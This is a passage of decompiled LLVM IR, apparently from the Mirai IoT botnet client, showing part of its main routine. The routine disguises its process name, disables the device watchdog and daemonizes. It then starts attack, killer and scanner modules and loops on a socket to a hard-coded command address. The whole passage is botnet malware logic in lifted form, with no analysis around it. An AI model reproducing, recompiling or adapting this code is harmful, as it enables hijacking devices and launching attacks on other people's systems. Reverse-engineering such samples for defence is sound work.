  %v3_d8e8 = call i32 @ioctl(i32 %v0_d8e0, i32 -2147199227, i32 0)
  %v1_d8f0 = call i32 @sleep(i32 10)
  br label %dec_label_pc_d8d4

dec_label_pc_d8f8:                                ; preds = %dec_label_pc_d884
  %v0_d8f8 = load i32, i32* @r5, align 4
  %v2_d900 = inttoptr i32 %v0_d8f8 to i32*
  %v3_d900 = call i32 @table_retrieve_val(i32 27, i32* %v2_d900)
  %v2_d908 = call i32 @__libc_open(i32 %v3_d900, i32 2)
  %v3_d90c = icmp eq i32 %v2_d908, -1
  store i32 %v2_d908, i32* @r4, align 4
  br i1 %v3_d90c, label %dec_label_pc_d918, label %dec_label_pc_d8bc

dec_label_pc_d918:                                ; preds = %dec_label_pc_d8f8
  %v1_d91c = call i32 @table_lock_val(i32 26)
  %v1_d924 = call i32 @table_lock_val(i32 27)
  %v0_d928 = load i32, i32* @r5, align 4
  %v1_d92c = call i32 @__GI_exit(i32 %v0_d928)
  %v0_d930 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d930, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_d918
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_d918, %bb14
  ret i32 %v1_d92c

; uselistorder directives
  uselistorder i32 %v2_d908, { 1, 2, 0 }
  uselistorder i32 %v2_d8ac, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_d84c, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_d944 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d944, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d95c = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_d968 = call i32 @__GI_sigaddset(i32 %v2_d944, i32 2)
  %v0_d96c = load i32, i32* @r5, align 4
  store i32 %v0_d96c, i32* %r2.global-to-local, align 4
  %v4_d978 = call i32 @__GI_sigprocmask(i32 %v0_d96c, i32* nonnull %stack_var_-64, i32 %v0_d96c)
  %v2_d984 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_d990 = call i32 @bsd_signal(i32 5, i32 54912)
  %v0_d994 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_24738.93 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_2473c.94, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_d994, i32* @global_var_2472c.58, align 4
  store i16 5888, i16* bitcast (i32* @global_var_2473a.95 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_24738.93 to i16*), align 4
  %v6_d9bc = call i32 @table_init(i32 %v0_d994, i32 ptrtoint (i32* @global_var_2472c.58 to i32), i32 ptrtoint (i16** @global_var_24738.93 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_d7fc.82 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21aa0.84 to i32), i32* @lr, align 4
  %v2_d9c8 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_d9c8, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_d7fc.82 to i32), i32* @global_var_21aa0.84, align 4
  %v1_d9d0 = call i32 @ensure_single_instance(i32 %v6_d9bc)
  %v1_d9d4 = call i32 @rand_init(i32 %v1_d9d0)
  store i32 %v2_d9c8, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_d9e0 = call i32 @util_zero()
  %v0_d9e4 = load i32, i32* @r6, align 4
  %v7_d9e4 = icmp eq i32 %v0_d9e4, 2
  br i1 %v7_d9e4, label %dec_label_pc_db14, label %dec_label_pc_d9ec

dec_label_pc_d9ec:                                ; preds = %dec_label_pc_db14, %entry, %dec_label_pc_db24
  %v0_d9ec = call i32 @rand_next()
  store i32 %v0_d9ec, i32* @r6, align 4
  %v0_d9f4 = load i32, i32* @r8, align 4
  %v1_d9f4 = inttoptr i32 %v0_d9f4 to i32*
  %v2_d9f4 = load i32, i32* %v1_d9f4, align 4
  %v1_d9f8 = inttoptr i32 %v2_d9f4 to i8*
  %v2_d9f8 = call i32 @util_strlen(i8* %v1_d9f8)
  %v0_da00 = load i32, i32* @r8, align 4
  %v1_da00 = inttoptr i32 %v0_da00 to i32*
  %v2_da00 = load i32, i32* %v1_da00, align 4
  %v1_da04 = inttoptr i32 %v2_da00 to i8*
  %v2_da04 = call i32 @util_strlen(i8* %v1_da04)
  %v1_da08 = sub i32 20, %v2_d9f8
  %v0_da10 = load i32, i32* @r6, align 4
  %v3_da14 = urem i32 %v0_da10, %v1_da08
  %v2_da18 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_da18, i32* @r5, align 4
  %v2_da1c = add i32 %v3_da14, %v2_da04
  store i32 %v2_da1c, i32* @r4, align 4
  %v2_da28 = call i32 @rand_alpha_str(i32 %v2_da18, i32 %v2_da1c)
  %v2_da2c = ptrtoint i32* %stack_var_-40 to i32
  %v1_da30 = load i32, i32* @r4, align 4
  %v2_da30 = add i32 %v1_da30, %v2_da2c
  store i32 %v2_da30, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_da3c = load i32, i32* @r8, align 4
  %v1_da3c = inttoptr i32 %v0_da3c to i32*
  %v2_da3c = load i32, i32* %v1_da3c, align 4
  store i32 %v2_da3c, i32* @r0, align 4
  %v3_da40 = add i32 %v2_da30, -80
  %v4_da40 = inttoptr i32 %v3_da40 to i8*
  store i8 0, i8* %v4_da40, align 1
  %v2_da44 = inttoptr i32 %v2_da3c to i8*
  %v3_da44 = call i32 @util_strcpy(i8* %v2_da44, i32 %v2_da18)
  store i32 32, i32* @r1, align 4
  store i32 %v2_da18, i32* @r0, align 4
  %v0_da50 = call i32 @util_zero()
  %v0_da54 = call i32 @rand_next()
  store i32 %v0_da54, i32* @r7, align 4
  %v0_da5c = load i32, i32* @r8, align 4
  %v1_da5c = inttoptr i32 %v0_da5c to i32*
  %v2_da5c = load i32, i32* %v1_da5c, align 4
  %v1_da60 = inttoptr i32 %v2_da5c to i8*
  %v2_da60 = call i32 @util_strlen(i8* %v1_da60)
  store i32 %v2_da60, i32* @r6, align 4
  %v0_da68 = load i32, i32* @r8, align 4
  %v1_da68 = inttoptr i32 %v0_da68 to i32*
  %v2_da68 = load i32, i32* %v1_da68, align 4
  %v1_da6c = inttoptr i32 %v2_da68 to i8*
  %v2_da6c = call i32 @util_strlen(i8* %v1_da6c)
  %v0_da70 = load i32, i32* @r6, align 4
  %v1_da70 = sub i32 20, %v0_da70
  %v0_da78 = load i32, i32* @r7, align 4
  %v3_da7c = urem i32 %v0_da78, %v1_da70
  %v2_da80 = add i32 %v3_da7c, %v2_da6c
  store i32 %v2_da80, i32* @r4, align 4
  %v2_da8c = call i32 @rand_alpha_str(i32 %v2_da18, i32 %v2_da80)
  store i32 %v2_da2c, i32* %r2.global-to-local, align 4
  %v1_da94 = load i32, i32* @r4, align 4
  %v2_da94 = add i32 %v1_da94, %v2_da2c
  store i32 %v2_da94, i32* %r3.global-to-local, align 4
  %v0_da98 = load i32, i32* @sl, align 4
  %v1_da98 = trunc i32 %v0_da98 to i8
  %v3_da98 = add i32 %v2_da94, -80
  %v4_da98 = inttoptr i32 %v3_da98 to i8*
  store i8 %v1_da98, i8* %v4_da98, align 1
  %v4_daa4 = call i32 @prctl(i32 15, i32 %v2_da18, i32 %v2_da2c, i32 %v2_da94)
  %v1_daac = call i32 @table_unlock_val(i32 5)
  %v3_dabc = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-48)
  %v3_dac0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_dac0, i32* @r2, align 4
  %v2_dacc = inttoptr i32 %v3_dabc to i64*
  %v3_dacc = call i32 @__GI___libc_write(i32 1, i64* %v2_dacc)
  store i32 1, i32* @r2, align 4
  %v3_dadc = call i32 @__GI___libc_write(i32 1, i64* bitcast (i32* @global_var_1928c.105 to i64*))
  %v1_dae4 = call i32 @table_lock_val(i32 5)
  %v1_dae8 = call i32 @attack_init(i32 %v1_dae4)
  %v1_daec = call i32 @killer_init(i32 %v1_dae8)
  %v1_daf0 = call i32 @watchdog_maintain(i32 %v1_daec)
  %v0_daf4 = call i32 @__libc_fork()
  %v1_daf8 = load i32, i32* @sl, align 4
  %v7_dafc = icmp sgt i32 %v0_daf4, %v1_daf8
  br i1 %v7_dafc, label %dec_label_pc_db00, label %dec_label_pc_db4c

dec_label_pc_db00:                                ; preds = %dec_label_pc_d9ec
  ret i32 %v1_daf8

dec_label_pc_db14:                                ; preds = %entry
  %v0_db14 = load i32, i32* @r8, align 4
  %v1_db14 = add i32 %v0_db14, 4
  %v2_db14 = inttoptr i32 %v1_db14 to i32*
  %v3_db14 = load i32, i32* %v2_db14, align 4
  %v1_db18 = inttoptr i32 %v3_db14 to i8*
  %v2_db18 = call i32 @util_strlen(i8* %v1_db18)
  %v8_db20 = icmp sgt i32 %v2_db18, 31
  br i1 %v8_db20, label %dec_label_pc_d9ec, label %dec_label_pc_db24

dec_label_pc_db24:                                ; preds = %dec_label_pc_db14
  %v0_db24 = load i32, i32* @r8, align 4
  %v1_db24 = add i32 %v0_db24, 4
  %v2_db24 = inttoptr i32 %v1_db24 to i32*
  %v3_db24 = load i32, i32* %v2_db24, align 4
  store i32 %v2_d9c8, i32* @r0, align 4
  %v2_db2c = bitcast i32* %stack_var_-152 to i8*
  %v3_db2c = call i32 @util_strcpy(i8* %v2_db2c, i32 %v3_db24)
  %v0_db30 = load i32, i32* @r8, align 4
  %v1_db30 = add i32 %v0_db30, 4
  %v2_db30 = inttoptr i32 %v1_db30 to i32*
  %v3_db30 = load i32, i32* %v2_db30, align 4
  %v1_db38 = inttoptr i32 %v3_db30 to i8*
  %v2_db38 = call i32 @util_strlen(i8* %v1_db38)
  store i32 %v2_db38, i32* @r1, align 4
  store i32 %v3_db30, i32* @r0, align 4
  %v0_db44 = call i32 @util_zero()
  br label %dec_label_pc_d9ec

dec_label_pc_db4c:                                ; preds = %dec_label_pc_d9ec
  %v1_db4c = call i32 @__GI_setsid(i32 %v0_daf4)
  %v0_db54 = load i32, i32* @sl, align 4
  %v1_db58 = call i32 @__GI___libc_close(i32 %v0_db54)
  %v1_db60 = call i32 @__GI___libc_close(i32 1)
  %v1_db68 = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_21a9c.107 to i32), i32* @fp, align 4
  %v1_db70 = call i32 @attack_init(i32 %v1_db68)
  %v1_db74 = call i32 @killer_init(i32 %v1_db70)
  %v1_db78 = call i32 @watchdog_maintain(i32 %v1_db74)
  %v1_db7c = call i32 @scanner_init(i32 %v1_db78)
  %v0_db80 = load i32, i32* @sl, align 4
  %v2_db84 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_db84, i32* @r7, align 4
  %v2_db88 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_db88, i32* @r6, align 4
  %v2_dc68 = ptrtoint i32* %stack_var_-72 to i32
  %v2_dcb8 = ptrtoint i32* %stack_var_-168 to i32
  %v2_de94 = ptrtoint i32* %stack_var_-56 to i32
  %v2_de9c = ptrtoint i8** %stack_var_-42 to i32
  %v2_e040 = ptrtoint i32* %stack_var_-1432 to i32
  %v2_deb8 = ptrtoint i32* %stack_var_-52 to i32
  %v1_df68 = bitcast i32* %stack_var_-152 to i8*
  %v2_df2c = ptrtoint i32* %stack_var_-88 to i32
  %v1_df44 = sub i32 0, %v1_db4c
  br label %dec_label_pc_db8c

dec_label_pc_db8c:                                ; preds = %dec_label_pc_dfc8, %dec_label_pc_e064, %bb44, %dec_label_pc_df64, %dec_label_pc_dd9c, %dec_label_pc_dd8c, %bb41, %dec_label_pc_e0b8, %dec_label_pc_e024, %dec_label_pc_dfd8, %dec_label_pc_dfb4, %dec_label_pc_dee4, %dec_label_pc_de0c, %dec_label_pc_dd44, %dec_label_pc_db4c
  %stack_var_-1436.0 = phi i32 [ %v0_db80, %dec_label_pc_db4c ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_dd8c ], [ %stack_var_-1436.1, %dec_label_pc_dd9c ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_dfd8 ], [ %stack_var_-1436.1, %dec_label_pc_de0c ], [ %stack_var_-1436.1, %dec_label_pc_e064 ], [ %stack_var_-1436.1, %dec_label_pc_e0b8 ], [ %stack_var_-1436.1, %dec_label_pc_e024 ], [ %stack_var_-1436.1, %dec_label_pc_dd44 ], [ %stack_var_-1436.1, %dec_label_pc_df64 ], [ %stack_var_-1436.1, %dec_label_pc_dfb4 ], [ %stack_var_-1436.1, %dec_label_pc_dee4 ], [ %stack_var_-1436.1, %dec_label_pc_dfc8 ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db98, %dec_label_pc_db8c
  %v1_db9c = phi i32 [ %v1_dba0, %dec_label_pc_db98 ], [ 4, %dec_label_pc_db8c ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_db9c = load i32, i32* @r7, align 4
  %v3_db9c = add i32 %v2_db9c, %v1_db9c
  %v4_db9c = inttoptr i32 %v3_db9c to i32*
  store i32 0, i32* %v4_db9c, align 4
  %v0_dba0 = load i32, i32* %r3.global-to-local, align 4
  %v1_dba0 = add i32 %v0_dba0, 4
  store i32 %v1_dba0, i32* %r3.global-to-local, align 4
  %v7_dba4 = icmp eq i32 %v1_dba0, 128
  br i1 %v7_dba4, label %dec_label_pc_dbac, label %dec_label_pc_db98

dec_label_pc_dbac:                                ; preds = %dec_label_pc_db98
  %v0_dbac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_dbac, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dbb4

dec_label_pc_dbb4:                                ; preds = %dec_label_pc_dbb4, %dec_label_pc_dbac
  %v1_dbb8 = phi i32 [ %v1_dbbc, %dec_label_pc_dbb4 ], [ 4, %dec_label_pc_dbac ]
  store i32 0, i32* @r4, align 4
  %v2_dbb8 = load i32, i32* @r6, align 4
  %v3_dbb8 = add i32 %v2_dbb8, %v1_dbb8
  %v4_dbb8 = inttoptr i32 %v3_dbb8 to i32*
  store i32 0, i32* %v4_dbb8, align 4
  %v0_dbbc = load i32, i32* %r3.global-to-local, align 4
  %v1_dbbc = add i32 %v0_dbbc, 4
  store i32 %v1_dbbc, i32* %r3.global-to-local, align 4
  %v7_dbc0 = icmp eq i32 %v1_dbbc, 128
  br i1 %v7_dbc0, label %dec_label_pc_dbc8, label %dec_label_pc_dbb4

dec_label_pc_dbc8:                                ; preds = %dec_label_pc_dbb4
  store i32 ptrtoint (i32* @global_var_21a98.86 to i32), i32* %r3.global-to-local, align 4
  %v2_dbcc = load i32, i32* @global_var_21a98.86, align 4
  %v7_dbd0 = icmp eq i32 %v2_dbcc, -1
  br i1 %v7_dbd0, label %dec_label_pc_dbfc, label %dec_label_pc_dbd8

dec_label_pc_dbd8:                                ; preds = %dec_label_pc_dbc8
  %v3_dbd8 = udiv i32 %v2_dbcc, 32
  %v3_dbdc = mul nuw nsw i32 %v3_dbd8, 4
  store i32 %v2_da2c, i32* %ip.global-to-local, align 4
  %v2_dbe4 = add i32 %v3_dbdc, %v2_da2c
  store i32 %v2_dbe4, i32* %r3.global-to-local, align 4
  %v1_dbe8 = add i32 %v2_dbe4, -240
  %v2_dbe8 = inttoptr i32 %v1_dbe8 to i32*
  %v3_dbe8 = load i32, i32* %v2_dbe8, align 4
  %v1_dbec = urem i32 %v2_dbcc, 32
  %v7_dbf4 = shl i32 1, %v1_dbec
  %v8_dbf4 = or i32 %v3_dbe8, %v7_dbf4
  store i32 %v8_dbf4, i32* %r2.global-to-local, align 4
  store i32 %v8_dbf4, i32* %v2_dbe8, align 4
  br label %dec_label_pc_dbfc

dec_label_pc_dbfc:                                ; preds = %dec_label_pc_dbc8, %dec_label_pc_dbd8
  %v2_dbfc = load i32, i32* @global_var_21a9c.107, align 4
  store i32 %v2_dbfc, i32* @r3, align 4
  %v7_dc00 = icmp eq i32 %v2_dbfc, -1
  store i32 ptrtoint (i32* @global_var_21a9c.107 to i32), i32* @r8, align 4
  br i1 %v7_dc00, label %dec_label_pc_de24, label %dec_label_pc_dc0c

dec_label_pc_dc0c:                                ; preds = %dec_label_pc_de24, %dec_label_pc_dbfc, %bb43
  %v2_dc10 = load i8, i8* bitcast (i8** @global_var_21c1c.110 to i8*), align 4
  %v2_dc14 = icmp eq i8 %v2_dc10, 0
  %v2_dd60 = load i32, i32* @global_var_21a9c.107, align 4
  store i32 %v2_dd60, i32* %ip.global-to-local, align 4
  %v3_dd64 = udiv i32 %v2_dd60, 32
  store i32 %v3_dd64, i32* %r3.global-to-local, align 4
  br i1 %v2_dc14, label %dec_label_pc_dd60, label %dec_label_pc_dc1c

dec_label_pc_dc1c:                                ; preds = %dec_label_pc_dc0c
  %v3_dc28 = mul nuw nsw i32 %v3_dd64, 4
  %v2_dc2c = add i32 %v3_dc28, %v2_da2c
  store i32 %v2_dc2c, i32* %r3.global-to-local, align 4
  %v1_dc30 = add i32 %v2_dc2c, -368
  %v2_dc30 = inttoptr i32 %v1_dc30 to i32*
  %v3_dc30 = load i32, i32* %v2_dc30, align 4
  %v1_dc34 = urem i32 %v2_dd60, 32
  %v7_dc3c = shl i32 1, %v1_dc34
  %v8_dc3c = or i32 %v3_dc30, %v7_dc3c
  store i32 %v8_dc3c, i32* %r2.global-to-local, align 4
  store i32 %v8_dc3c, i32* %v2_dc30, align 4
  br label %dec_label_pc_dc44

dec_label_pc_dc44:                                ; preds = %dec_label_pc_dd60, %dec_label_pc_dc1c
  store i32 ptrtoint (i32* @global_var_21a98.86 to i32), i32* %r3.global-to-local, align 4
  %v2_dc48 = load i32, i32* @global_var_21a98.86, align 4
  store i32 0, i32* @lr, align 4
  %v0_dc50 = load i32, i32* %ip.global-to-local, align 4
  %v5_dc54 = icmp slt i32 %v0_dc50, %v2_dc48
  br i1 %v5_dc54, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_dc44
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_dc44, %bb
  %v0_dc64 = phi i32 [ %v2_dc48, %dec_label_pc_dc44 ], [ %v0_dc50, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_dc64 = add i32 %v0_dc64, 1
  store i32 %v2_dc68, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_db88, i32* %r2.global-to-local, align 4
  %v5_dc80 = call i32 @__libc_select(i32 %v1_dc64, i32 %v2_db84, i32 %v2_db88, i32 0, i32 %v2_dc68)
  %v8_dc84 = icmp eq i32 %v5_dc80, -1
  br i1 %v8_dc84, label %dec_label_pc_db8c, label %dec_label_pc_dc8c

dec_label_pc_dc8c:                                ; preds = %bb41
  %v6_dc80 = trunc i32 %v5_dc80 to i16
  %v3_dc8c = icmp eq i16 %v6_dc80, 0
  br i1 %v3_dc8c, label %dec_label_pc_dc94, label %dec_label_pc_dcc8

dec_label_pc_dc94:                                ; preds = %dec_label_pc_dc8c
  %v5_dca0 = srem i32 %stack_var_-1436.0, 6
  %v4_dca8 = sub i32 %stack_var_-1436.0, %v5_dca0
  store i32 %v4_dca8, i32* %r3.global-to-local, align 4
  %v2_dcb0 = icmp eq i32 %v5_dca0, 0
  %v1_dcb4 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_dcb4, i32* @lr, align 4
  store i32 %v2_dcb8, i32* %r2.global-to-local, align 4
  %v7_dcbc = inttoptr i32 %v5_dc80 to i8*
  store i8* %v7_dcbc, i8** %stack_var_-42, align 4
  br i1 %v2_dcb0, label %dec_label_pc_de94, label %dec_label_pc_dcc8

dec_label_pc_dcc8:                                ; preds = %dec_label_pc_dc8c, %dec_label_pc_dc94, %dec_label_pc_de94
  %stack_var_-1436.1 = phi i32 [ %v1_dcb4, %dec_label_pc_de94 ], [ %v1_dcb4, %dec_label_pc_dc94 ], [ %stack_var_-1436.0, %dec_label_pc_dc8c ]
  store i32 ptrtoint (i32* @global_var_21a98.86 to i32), i32* %r3.global-to-local, align 4
  %v2_dccc = load i32, i32* @global_var_21a98.86, align 4
  %v7_dcd0 = icmp eq i32 %v2_dccc, -1
  br i1 %v7_dcd0, label %dec_label_pc_dcfc, label %dec_label_pc_dcd8

dec_label_pc_dcd8:                                ; preds = %dec_label_pc_dcc8
  %v3_dcd8 = udiv i32 %v2_dccc, 32
  %v3_dcdc = mul nuw nsw i32 %v3_dcd8, 4
  store i32 %v2_da2c, i32* %ip.global-to-local, align 4
  %v2_dce4 = add i32 %v3_dcdc, %v2_da2c
  store i32 %v2_dce4, i32* %r3.global-to-local, align 4
  %v1_dce8 = add i32 %v2_dce4, -240
  %v2_dce8 = inttoptr i32 %v1_dce8 to i32*
  %v3_dce8 = load i32, i32* %v2_dce8, align 4
  %v1_dcec = urem i32 %v2_dccc, 32
  %v6_dcf0 = ashr i32 %v3_dce8, %v1_dcec
  store i32 %v6_dcf0, i32* %r2.global-to-local, align 4
  %v1_dcf4 = urem i32 %v6_dcf0, 2
  %v2_dcf4 = icmp eq i32 %v1_dcf4, 0
  br i1 %v2_dcf4, label %dec_label_pc_dcfc, label %dec_label_pc_df20

dec_label_pc_dcfc:                                ; preds = %dec_label_pc_dcd8, %dec_label_pc_dcc8
  %v2_dd00 = load i8, i8* bitcast (i8** @global_var_21c1c.110 to i8*), align 4
  %v3_dd00 = zext i8 %v2_dd00 to i32
  store i32 %v3_dd00, i32* @r4, align 4
  %v2_dd04 = icmp eq i8 %v2_dd00, 0
  %v2_dd8c = load i32, i32* @global_var_21a9c.107, align 4
  br i1 %v2_dd04, label %dec_label_pc_dd8c, label %dec_label_pc_dd0c

dec_label_pc_dd0c:                                ; preds = %dec_label_pc_dcfc
  %v3_dd10 = udiv i32 %v2_dd8c, 32
  store i32 %v2_da2c, i32* %r2.global-to-local, align 4
  %v3_dd18 = mul nuw nsw i32 %v3_dd10, 4
  %v2_dd1c = add i32 %v3_dd18, %v2_da2c
  store i32 %v2_dd1c, i32* %r3.global-to-local, align 4
  %v1_dd20 = add i32 %v2_dd1c, -368
  %v2_dd20 = inttoptr i32 %v1_dd20 to i32*
  %v3_dd20 = load i32, i32* %v2_dd20, align 4
  %v1_dd24 = urem i32 %v2_dd8c, 32
  %v6_dd28 = ashr i32 %v3_dd20, %v1_dd24
  store i32 %v6_dd28, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_21c1c.110 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_dd34 = urem i32 %v6_dd28, 2
  %v2_dd34 = icmp eq i32 %v1_dd34, 0
  store i8 0, i8* bitcast (i8** @global_var_21c1c.110 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_21a9c.107 to i32), i32* @r5, align 4
  br i1 %v2_dd34, label %dec_label_pc_dd44, label %dec_label_pc_deb0

dec_label_pc_dd44:                                ; preds = %dec_label_pc_dd0c
  store i32 56652, i32* @lr, align 4
  %v1_dd48 = icmp ne i32 %v2_dd8c, -1
  call void @__pseudo_cond_branch(i1 %v1_dd48, i32 ptrtoint (i32* @global_var_14260.112 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dd50 = load i32, i32* @r5, align 4
  %v2_dd50 = inttoptr i32 %v1_dd50 to i32*
  store i32 -1, i32* %v2_dd50, align 4
  %v1_dd58 = call i32 @sleep(i32 1)
  br label %dec_label_pc_db8c

dec_label_pc_dd60:                                ; preds = %dec_label_pc_dc0c
  store i32 %v2_da2c, i32* %r2.global-to-local, align 4
  %v3_dd6c = mul nuw nsw i32 %v3_dd64, 4
  %v2_dd70 = add i32 %v3_dd6c, %v2_da2c
  store i32 %v2_dd70, i32* %r3.global-to-local, align 4
  %v1_dd74 = add i32 %v2_dd70, -240
  %v2_dd74 = inttoptr i32 %v1_dd74 to i32*
  %v3_dd74 = load i32, i32* %v2_dd74, align 4
  %v1_dd78 = urem i32 %v2_dd60, 32
  %v7_dd80 = shl i32 1, %v1_dd78
  %v8_dd80 = or i32 %v3_dd74, %v7_dd80
  store i32 %v8_dd80, i32* %r2.global-to-local, align 4
  store i32 %v8_dd80, i32* %v2_dd74, align 4
  br label %dec_label_pc_dc44

dec_label_pc_dd8c:                                ; preds = %dec_label_pc_dcfc
  %v7_dd90 = icmp eq i32 %v2_dd8c, -1
  store i32 ptrtoint (i32* @global_var_21a9c.107 to i32), i32* @r8, align 4
  br i1 %v7_dd90, label %dec_label_pc_db8c, label %dec_label_pc_dd9c

dec_label_pc_dd9c:                                ; preds = %dec_label_pc_dd8c
  %v3_dd9c = udiv i32 %v2_dd8c, 32
  store i32 %v2_da2c, i32* %r2.global-to-local, align 4
  %v3_dda4 = mul nuw nsw i32 %v3_dd9c, 4
  %v2_dda8 = add i32 %v3_dda4, %v2_da2c
  store i32 %v2_dda8, i32* %r3.global-to-local, align 4
  %v1_ddac = add i32 %v2_dda8, -240
  %v2_ddac = inttoptr i32 %v1_ddac to i32*
  %v3_ddac = load i32, i32* %v2_ddac, align 4
  %v1_ddb0 = urem i32 %v2_dd8c, 32
  %v6_ddb4 = ashr i32 %v3_ddac, %v1_ddb0
  store i32 %v6_ddb4, i32* %r2.global-to-local, align 4
  %v1_ddb8 = urem i32 %v6_ddb4, 2
  %v2_ddb8 = icmp eq i32 %v1_ddb8, 0
  br i1 %v2_ddb8, label %dec_label_pc_db8c, label %dec_label_pc_ddc0

dec_label_pc_ddc0:                                ; preds = %dec_label_pc_dd9c
  %v6_ddc4 = inttoptr i32 %v3_dd00 to i8*
  store i8* %v6_ddc4, i8** %stack_var_-42, align 4
  store i32 %v2_de9c, i32* @sl, align 4
  %v0_ddc8 = call i32 @__GI___errno_location()
  %v0_ddcc = load i32, i32* @r4, align 4
  %v2_ddcc = inttoptr i32 %v0_ddc8 to i32*
  store i32 %v0_ddcc, i32* %v2_ddcc, align 4
  store i32 %v0_ddc8, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_dddc = load i32, i32* @global_var_21a9c.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_dde8 = call i32 @__libc_recv(i32 %v2_dddc, i32 %v2_de9c, i32 2, i32 16386)
  %v7_ddec = icmp eq i32 %v4_dde8, -1
  br i1 %v7_ddec, label %dec_label_pc_dfc8, label %dec_label_pc_ddf4

dec_label_pc_ddf4:                                ; preds = %dec_label_pc_ddc0
  %v2_ddf4 = icmp eq i32 %v4_dde8, 0
  br i1 %v2_ddf4, label %dec_label_pc_dfd8, label %dec_label_pc_ddfc

dec_label_pc_ddfc:                                ; preds = %dec_label_pc_ddf4
  store i32 %v2_dcb8, i32* %ip.global-to-local, align 4
  %v3_de00 = load i8*, i8** %stack_var_-42, align 4
  %v4_de00 = ptrtoint i8* %v3_de00 to i32
  store i32 %v4_de00, i32* %r3.global-to-local, align 4
  %v2_de04 = icmp eq i8* %v3_de00, null
  br i1 %v2_de04, label %dec_label_pc_de0c, label %dec_label_pc_e008

dec_label_pc_de0c:                                ; preds = %dec_label_pc_ddfc
  %v2_de0c = load i32, i32* @global_var_21a9c.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_de18 = add i32 %v4_de00, 16384
  store i32 %v1_de18, i32* %r3.global-to-local, align 4
  %v4_de1c = call i32 @__libc_recv(i32 %v2_de0c, i32 %v2_de9c, i32 2, i32 %v1_de18)
  br label %dec_label_pc_db8c

dec_label_pc_de24:                                ; preds = %dec_label_pc_dbfc
  %v0_de2c = load i32, i32* @r4, align 4
  store i32 %v0_de2c, i32* %r2.global-to-local, align 4
  %v3_de30 = call i32 @socket(i32 2, i32 1, i32 %v0_de2c)
  %v7_de34 = icmp eq i32 %v3_de30, -1
  store i32 %v3_de30, i32* @r5, align 4
  %v1_de3c = load i32, i32* @r8, align 4
  %v2_de3c = inttoptr i32 %v1_de3c to i32*
  store i32 %v3_de30, i32* %v2_de3c, align 4
  br i1 %v7_de34, label %dec_label_pc_dc0c, label %dec_label_pc_de44

dec_label_pc_de44:                                ; preds = %dec_label_pc_de24
  %v0_de44 = load i32, i32* @r4, align 4
  store i32 %v0_de44, i32* @r2, align 4
  %v2_de4c = call i32 @__libc_fcntl(i32 %v3_de30, i32 3)
  %v1_de54 = or i32 %v2_de4c, 2048
  store i32 %v1_de54, i32* @r2, align 4
  %v0_de58 = load i32, i32* @r5, align 4
